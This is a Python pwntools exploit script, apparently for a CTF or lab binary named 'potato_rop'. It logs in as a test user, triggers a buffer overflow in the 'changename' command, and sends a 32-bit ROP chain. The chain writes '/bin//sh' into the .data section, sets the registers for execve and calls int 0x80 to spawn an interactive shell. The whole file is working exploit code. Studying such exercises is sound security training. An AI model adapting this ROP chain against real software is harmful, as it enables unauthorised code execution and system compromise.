#!/usr/bin/env python3

from pwn import *
from struct import pack

import sys

elf = ELF("./potato_rop")
context.binary = elf
context.arch = 'i386'
context.bits = 32
context.endian = 'little'
context.os = 'linux'

process = elf.process(["console"], stdin=PTY, aslr=False) # stdin=PTY for "getpass" password input
gdb.attach(process, '''
#break func.c:183
break *change_name + 138
continue
''')

print(process.recvuntil(b"cmd> ")) # username
process.sendline(b"login")
# test user
process.sendline(b"peter")
process.sendline(b"12345")
print(process.recvuntil(b"cmd> ")) # username

process.sendline(b"changename")

# Padding goes here
p=b"\x41"*58 + p32(0x080e53c2)

# ROP sequence
p += pack('<I', 0x0806970e) # pop edx ; pop ebx ; pop esi ; ret
p += pack('<I', 0x0811e040) # @ .data
p += pack('<I', 0x41414141) # padding
p += pack('<I', 0x41414141) # padding
p += pack('<I', 0x0804be89) # pop eax ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret
p += b'/bin'
p += pack('<I', 0x41414141) # padding
p += pack('<I', 0x41414141) # padding
p += pack('<I', 0x41414141) # padding
p += pack('<I', 0x41414141) # padding
p += pack('<I', 0x0807d1fb) # mov dword ptr [edx], eax ; ret
p += pack('<I', 0x0806970e) # pop edx ; pop ebx ; pop esi ; ret
p += pack('<I', 0x0811e044) # @ .data + 4
p += pack('<I', 0x41414141) # padding
p += pack('<I', 0x41414141) # padding
p += pack('<I', 0x0804be89) # pop eax ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret
p += b'//sh'
p += pack('<I', 0x41414141) # padding
p += pack('<I', 0x41414141) # padding
p += pack('<I', 0x41414141) # padding
p += pack('<I', 0x41414141) # padding
p += pack('<I', 0x0807d1fb) # mov dword ptr [edx], eax ; ret
p += pack('<I', 0x0806970e) # pop edx ; pop ebx ; pop esi ; ret
p += pack('<I', 0x0811e048) # @ .data + 8
p += pack('<I', 0x41414141) # padding
p += pack('<I', 0x41414141) # padding
p += pack('<I', 0x0805ba10) # xor eax, eax ; ret
p += pack('<I', 0x0807d1fb) # mov dword ptr [edx], eax ; ret
p += pack('<I', 0x0804901e) # pop ebx ; ret
p += pack('<I', 0x0811e040) # @ .data
p += pack('<I', 0x08061c9d) # pop ecx ; ret
p += pack('<I', 0x0811e048) # @ .data + 8
p += pack('<I', 0x0806970e) # pop edx ; pop ebx ; pop esi ; ret
p += pack('<I', 0x0811e048) # @ .data + 8
p += pack('<I', 0x0811e040) # padding without overwrite ebx
p += pack('<I', 0x41414141) # padding
p += pack('<I', 0x0805ba10) # xor eax, eax ; ret
p += pack('<I', 0x0806a8bc) # inc eax ; pop edi ; ret
p += pack('<I', 0x41414141) # padding
p += pack('<I', 0x0806a8bc) # inc eax ; pop edi ; ret
p += pack('<I', 0x41414141) # padding
p += pack('<I', 0x0806a8bc) # inc eax ; pop edi ; ret
p += pack('<I', 0x41414141) # padding
p += pack('<I', 0x0806a8bc) # inc eax ; pop edi ; ret
p += pack('<I', 0x41414141) # padding
p += pack('<I', 0x0806a8bc) # inc eax ; pop edi ; ret
p += pack('<I', 0x41414141) # padding
p += pack('<I', 0x0806a8bc) # inc eax ; pop edi ; ret
p += pack('<I', 0x41414141) # padding
p += pack('<I', 0x0806a8bc) # inc eax ; pop edi ; ret
p += pack('<I', 0x41414141) # padding
p += pack('<I', 0x0806a8bc) # inc eax ; pop edi ; ret
p += pack('<I', 0x41414141) # padding
p += pack('<I', 0x0806a8bc) # inc eax ; pop edi ; ret
p += pack('<I', 0x41414141) # padding
p += pack('<I', 0x0806a8bc) # inc eax ; pop edi ; ret
p += pack('<I', 0x41414141) # padding
p += pack('<I', 0x0806a8bc) # inc eax ; pop edi ; ret
p += pack('<I', 0x41414141) # padding
p += pack('<I', 0x0804c6c2) # int 0x80


process.sendline(p)

process.interactive()
